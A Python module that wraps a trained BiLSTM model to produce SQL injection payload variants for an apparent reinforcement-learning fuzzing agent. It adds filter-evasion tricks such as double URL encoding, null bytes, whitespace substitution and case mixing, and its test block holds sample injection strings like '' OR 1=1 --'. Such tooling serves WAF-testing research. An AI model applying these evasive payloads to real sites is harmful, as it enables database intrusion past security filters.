"""
BiLSTM Wrapper for Hybrid RL Agent
Provides a clean interface to the existing BiLSTM model for generating mutation candidates.
"""
import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import torch
from bilstm_sqli.inference import load_model, translate_sentence

class BiLSTMGenerator:
    """Wrapper around the trained BiLSTM model for generating SQL injection mutations."""
    
    def __init__(self, model_path='../bilstm_sqli/bilstm_model.pt', vocab_path='../bilstm_sqli/vocab.pkl'):
        """Load the pre-trained BiLSTM model."""
        print("Loading BiLSTM model...")
        # Get absolute paths to handle running from different directories
        script_dir = os.path.dirname(os.path.abspath(__file__))
        project_root = os.path.dirname(script_dir)
        
        vocab_full_path = os.path.join(project_root, 'bilstm_sqli', 'vocab.pkl')
        model_full_path = os.path.join(project_root, 'bilstm_sqli', 'bilstm_model.pt')
        
        self.model, self.vocab, self.device = load_model(vocab_full_path, model_full_path)
        print(f"BiLSTM loaded successfully on {self.device}")
    
    def generate_candidates(self, base_payload, num_candidates=5):
        """
        Generate multiple mutation candidates for a given payload.
        Uses BOTH BiLSTM generation AND manual mutation operators for diversity.
        
        Args:
            base_payload (str): Original SQL injection payload
            num_candidates (int): Number of mutations to generate
            
        Returns:
            list: List of mutated payload strings
        """
        candidates = []
        
        # Strategy 1: Get BiLSTM mutations (2-3 candidates)
        bilstm_count = min(3, num_candidates)
        for i in range(bilstm_count * 2):  # Try twice as many to get unique ones
            try:
                mutated = translate_sentence(base_payload, self.model, self.vocab, self.device)
                if mutated and mutated not in candidates and mutated != base_payload:
                    candidates.append(mutated)
                    if len(candidates) >= bilstm_count:
                        break
            except Exception as e:
                pass
        
        # Strategy 2: Add manual mutation operators (remaining candidates)
        # These are guaranteed to be different and effective
        manual_mutations = self._apply_manual_mutations(base_payload)
        
        for mutation in manual_mutations:
            if mutation not in candidates and len(candidates) < num_candidates:
                candidates.append(mutation)
        
        # Ensure we have exactly num_candidates
        while len(candidates) < num_candidates:
            candidates.append(base_payload)
        
        return candidates[:num_candidates]
    
    def _apply_manual_mutations(self, payload):
        """
        Apply traditional mutation operators for guaranteed diversity.
        These complement the BiLSTM's learned mutations.
        """
        import urllib.parse
        mutations = []
        
        # 1. Double URL encoding
        try:
            double_encoded = urllib.parse.quote(urllib.parse.quote(payload))
            if double_encoded != payload:
                mutations.append(double_encoded)
        except:
            pass
        
        # 2. Null byte injection
        mutations.append(payload + "%00")
        
        # 3. Tab encoding (replace spaces)
        tab_encoded = payload.replace(" ", "%09").replace("%20", "%09")
        if tab_encoded != payload:
            mutations.append(tab_encoded)
        
        # 4. Newline encoding
        newline_encoded = payload.replace(" ", "%0A").replace("%20", "%0A")
        if newline_encoded != payload:
            mutations.append(newline_encoded)
        
        # 5. Mixed case (for case-sensitive filters)
        mixed_case = ""
        for i, char in enumerate(payload):
            if char.isalpha():
                mixed_case += char.upper() if i % 2 == 0 else char.lower()
            else:
                mixed_case += char
        if mixed_case != payload:
            mutations.append(mixed_case)
        
        # 6. Extra comment injection
        comment_injected = payload.replace("/**/", "/**//**/")
        if comment_injected != payload:
            mutations.append(comment_injected)
        
        return mutations
    
    def generate_single(self, base_payload):
        """Generate a single mutation (for backward compatibility)."""
        return translate_sentence(base_payload, self.model, self.vocab, self.device)


if __name__ == "__main__":
    # Test the wrapper
    generator = BiLSTMGenerator()
    
    test_payloads = [
        "' OR 1=1 --",
        "admin' --",
        "' UNION SELECT 1,2,3 --"
    ]
    
    print("\n--- Testing BiLSTM Candidate Generation ---")
    for payload in test_payloads:
        print(f"\nBase: {payload}")
        candidates = generator.generate_candidates(payload, num_candidates=5)
        for i, candidate in enumerate(candidates):
            print(f"  [{i}] {candidate}")
